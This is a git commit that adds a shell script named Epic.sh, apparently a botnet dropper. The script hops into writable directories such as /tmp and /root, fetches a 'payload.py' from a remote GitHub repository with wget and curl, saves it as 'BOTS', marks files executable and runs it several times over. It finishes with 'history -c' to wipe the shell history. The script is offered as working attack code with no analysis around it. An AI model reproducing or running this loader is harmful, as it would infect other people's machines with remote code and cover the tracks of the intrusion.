58bf26faa363e16ef9c6e30baf55c6b996d42eb9
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2023-06-08 11:39:58 +0700

    Create Epic.sh

---
+++ Epic.sh
@@ -0,0 +1,25 @@
+#!/usr/bin/env
+
+#!/bin/bash
+
+#!/usr/bin/python
+
+ulimit -n 1024
+
+cp /bin/busybox /tmp/
+
+pip install requests || pip3 install requests || python -m pip install requests || python3 -m pip install requests|| python -m pip3 install requests || python3 -m pip3 install requests
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;cat payload.py >BOTS;chmod +x *;./BOTS
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;chmod +x *;./payload.py
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;chmod +x *;python3 payload.py
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;cat payload.py >BOTS;chmod 777;./BOTS
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;chmod 777;./payload.py
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;chmod 777;python3 payload.py
+
+history -c
